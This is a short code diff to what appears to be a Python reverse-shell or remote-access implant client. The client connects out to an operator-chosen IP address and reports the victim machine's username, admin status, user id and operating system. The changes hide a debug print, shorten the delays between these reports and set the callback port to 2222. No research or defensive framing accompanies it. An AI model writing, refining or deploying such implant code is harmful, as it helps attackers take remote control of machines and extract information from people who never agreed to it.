@@ -34,7 +34,7 @@ def inbound_message():
 def outbound_message(message):
     response = str(message).encode()
     sock.send(response)
-    print('Message = ', message)
+    # print('Message = ', message)
     print('[+] Reply sent...')
 
 
@@ -43,15 +43,15 @@ def session_handler():
     sock.connect((host_ip, host_port))
     if platform.system() == 'Windows':
         outbound_message(os.getlogin())
-        time.sleep(0.5)
+        time.sleep(0.2)
         outbound_message(ctypes.windll.shell32.IsUserAnAdmin())
-        time.sleep(0.5)
+        time.sleep(0.2)
         outbound_message(platform.system())
     else:
         outbound_message(pwd.getpwuid(os.getuid())[0])
-        time.sleep(0.5)
+        time.sleep(0.2)
         outbound_message(os.getuid())
-        time.sleep(0.5)
+        time.sleep(0.2)
         outbound_message(platform.system())
 
     print(f'[+] Connected to {host_ip}')
@@ -91,5 +91,5 @@ if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     host_ip = "INPUT_IP_HERE"
-    host_port = INPUT_PORT_HERE
+    host_port = 2222  # INPUT_PORT_HERE
     session_handler()
